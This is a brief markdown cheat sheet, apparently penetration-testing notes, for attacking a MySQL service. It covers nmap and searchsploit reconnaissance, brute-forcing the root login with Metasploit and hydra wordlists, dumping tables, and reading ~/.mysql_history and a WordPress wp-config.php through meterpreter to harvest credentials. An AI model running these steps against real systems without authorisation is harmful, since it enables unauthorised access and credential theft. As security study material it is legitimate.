# MySQL
- Basic nmap scan.
  ```
  nmap -Pn -sV -sC -p3306 <ip>
  ```

- Check for existing exploits.
  ```
  searchsploit MySQL <version>
  
  search MySQL <version>
  ```

- Check MySQL version.
  ```
  use auxiliary/scanner/mysql/mysql_version
  ```

- Brute-force MySQL login.
  ```
  use auxiliary/scanner/mysql/mysql_login
  set USERNAME root
  set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
  set VERBOSE false
  ```
  ```
  hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
  
  [ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
  ```

- Connect to MySQL remotely.
  ```
  mysql -u root -p -h <ip>
  
  show databases;
  use <database>;
  show tables;
  select * from <table>;
  ```

- Check mysql command history.
  ```
  cat ~/.mysql_history
  ```

- Check Web app (e.g. WordPress) config file for MySQL root credentials.
  ```
  meterpreter > cat C:\\wamp\\www\\wordpress\\wp-config.php
  
  /** MySQL database username */
  define('DB_USER', 'root');
  
  /** MySQL database password */
  define('DB_PASSWORD', '');
  ```
